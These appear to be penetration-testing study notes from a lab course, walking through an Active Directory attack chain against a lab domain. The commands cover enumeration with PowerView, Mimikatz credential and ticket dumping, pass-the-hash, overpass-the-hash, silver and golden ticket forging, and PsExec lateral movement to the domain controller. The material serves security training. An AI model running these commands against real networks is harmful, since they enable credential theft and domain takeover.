---
description: Page 623
---

# Methodology

## Enumeration

* Just landed on a box?&#x20;

```
whoami /priv
```

## Traditional Approach

Enumerate all local accounts:

```
net user
```

Enumerate all users in the entire domain:

```
net user /domain

net user jeff_admin /domain
```

Enumerate all groups in the domain:

```
net group /domain
```

## Modern Approach

Transfer Tools to compromised host

Kali:

```
impacket-smbserver smb .
```

Windows:

```
net use \\kali-ip\smb

copy \\kali-ip\smb\PowerView.ps1 .

dir

PowerView.ps1
```

Import module:

```
Import-Module .\PowerView.ps1
```

Enumerate logged-in users:

```
Get-NetLoggedon -ComputerName client251
```

Enumerate all active sessions:

```
Get-NetSession -ComputerName dc01
```

## SPNs

* An alternative to attacking a domain user account is to target so-called service accounts
* It is very possible that they are members of high-value groups

PowerShell script used to detect registered service principal names:

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }
}
```

## Authentication

### New Technology LAN Manager (NTLM)

* <mark style="color:yellow;">NTLM is used when a client authenticates to a server by IP address instead of hostname</mark>

### Kerberos

* <mark style="color:yellow;">Kerberos authentication involves the usage of a Domain Controller that is in the role of a Key Distribution Center (KDC).</mark>

### Cached Credential Storage and Completion

* Kerberos makes use of SSO password hashes
* These hashes are stored in memory space known as Local Security Authority Subsystem Service (<mark style="color:yellow;">LSASS</mark>) memory space
* <mark style="color:yellow;">If we are able to gain access to these hashes, we could take them offline and crack them to obtain the cleartext password or reuse them to perform various actions</mark>

### Mimikatz

* Transfer Mimikatz to the Windows host through our SMB server
* We will be running Mimikatz locally
* If it is acting up, it may be due to an Evil-WinRM shell
* Attempt another reverse shell if possible

Usage:

```
.\Mimikatz.exe

privilege::debug

sekurlsa::logonpasswords
```

* This should dump the credentials of all logged-on users using the Sekurlsa module
* Armed with hashes? Crack them offline and pass them around the network.

Dumping tickets in memory:

```
sekurlsa::tickets
```

* If you get a TGT or TGS, this would <mark style="color:yellow;">allow you to access particular resources associated with those tickets</mark>
* <mark style="color:yellow;">Also, if you are armed with a TGT ticket, you could request a TGS for specific resources you want to target within the domain</mark>

```
kerberos::list /export

1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

### Kerberoasting

```
tgsrepcrack.py

impacket-GetUserSPNs
 
hashcat
```

## Lateral Movement

* Locate high-value targets
* Find workstations or servers that these targets are logged into
* Gather password hashes
* Recover existing tickets
* Leverage them for Kerberos Authentication

<mark style="color:yellow;">Do all of the above in order to use lateral movement to compromise other machines within the domain.</mark>

<mark style="color:yellow;">A logical step would be to crack any password hashes that you may have obtained and authenticate to a machine with cleartext passwords to gain access.</mark>

<mark style="color:yellow;">Can we pass the hash if password cracking is not possible?</mark>

## Pass the Hash

Pass the Hash (PTH) is a technique that allows an attacker to authenticate to a remote system or service using a user's NTLM hash instead of the associated plaintext password.

Use these tools to PTH:

* PsExec
* Metasploit
* Impacket
* Passing-the-Hash Toolkit

PTH Toolkit:

```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e 
//10.11.0.22 cmd
```

## Overpass the Hash

This method can be used to over abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket.&#x20;

This will in return grant us access to another machine or service as that user.

We can verify this with mimikatz:

```
sekurlsa::logonpasswords
```

* This will display cached credentials
* NTLM hash
* We can then leverage this to overpass the hash

<mark style="color:yellow;">Our goal is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication.</mark>&#x20;

We can do this will sekurlsa::pth from mimikatz:

```
sekurlsa::pth /user:jeff_admin /domain:corp.com 
/ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
```

* Now that we have a new PowerShell session, we can execute commands as this user.

List cached Kerberos tickets:

```
klist

#if there are none, generate some by authenticating to the network share

net use \\hostname

klist
```

It is possible for PsExec to run a command remotely but does not accept password hashes.

This is possible with a generated Kerberos hash. We can then reuse this TGT to obtain code execution on the DC.

By running PsExec to launch cmd.exe remotely on a remote machine as a high privileged user:

```
.\PsExec.exe \\dc01 cmd.exe

C:\Windows\System32>
```

## Pass the Ticket (Silver Ticket)

The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network.

It can then be used to authenticate to a service.

If the service tickets belong to the current user, no administrative privileges are required.

Mimikatz can craft a silver ticket and inject it into memory using the kerberos::golden command

* <mark style="color:yellow;">Yes, the syntax is misleading.</mark>

To create a ticket, we need the Security Identifier or SID of the domain.

Example of SID:

```
S-1-5-21-2536614405-3629634762-1218571035-1116

```

<mark style="color:yellow;">We can easily find the SID of our current user with the whoami /user command and extract the domain SID part of it.</mark>

```
whoami /user

SID
S-1-5-21-2536614405-3629634762-1218571035-1116

```

Now that we have the domain SID, let's craft a silver ticket for the IIS service

### Requirements

1. The silver ticket command requires a username <mark style="color:yellow;">/user</mark>

&#x20; 2\. Domain name <mark style="color:yellow;">/domain</mark>

&#x20; 3\. Domain SID <mark style="color:yellow;">/sid</mark>

&#x20; 4\. Fully qualified host name of the     service <mark style="color:yellow;">/target</mark>

&#x20; 5\. Service rtpe <mark style="color:yellow;">/service:HTTP</mark>

&#x20; 6\. Password hash of service account <mark style="color:yellow;">/rc4</mark>

Finally, the silver ricket is injected into memory with the /ppt flag.

<mark style="color:yellow;">Before running this, we will flush any existing Kerberos tickets with kerberos::purge and verify the purge with kerberos::list</mark>

Mimikatz:

```
kerberos::purge
Ticket(s) purge for current session is ok

kerberos::list

kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP 
/rc4:E2B475C11DA2A0748290D87AA966C327 /ptt

kerberos::list
```

* To create a silver ticket, we use the password hash and not the cleartext password
* If a Kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket

### Conclusion

* Now that we have this ticket loaded into memory, we can interact with the service and gain access to any information on the group memberships we put in the silver ticket
* Depending on the service type, it might also be possible to obtain code execution

## Golden Tickets

* When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key that is known only to the KDC's in the domain
* This <mark style="color:yellow;">secret key</mark> is actually the password of a domain user account called krbtgt
* <mark style="color:yellow;">If we are able to gain access to the krbtgt hash, we can create our own TGT or golden tickets!</mark>
* For example, we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins Group and the domain controller will trust it!

<mark style="color:yellow;">You need to have compromised a member within the Domain Admins group or the Domain Controller itself.</mark>

With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz.

```
privilege::debug
OK

lsadump::lsa /patch

User: krbtgt
NTLM: 75b60230a2394a812000dbfad8415965
```

* <mark style="color:yellow;">Remember, you are after the NTLM hash for the krbtgt account!</mark>

Fun fact:&#x20;

Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain.

* Before generating the golden ticket, delete any existing Kerberos tickets with <mark style="color:yellow;">kerberos::purge</mark>
* We need to supply the domain SID (we can obtain with whoami /user) to the Mimikatz <mark style="color:yellow;">kerberos::golden</mark>&#x20;
  * This will create the golden ticket
* Be sure to use the /krbtgt to indicate that you are supplying the hash
* You can set the golden ticket's username to anything such as fakeuser in this
* This is because the DC will trust anything that is encrypted by the krbtgt password hash

```
kerberos::purge

 kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-
2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
```

Upon success, you will see:

```
Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session

misc::cmd
```

With the golden ticket injected into memory, we can launch a new command prompt with misc::cmd and again attempt lateral movement with PsExec

```
psexec.exe \\dc01 cmd.exe

C:\Windows\System32>
```















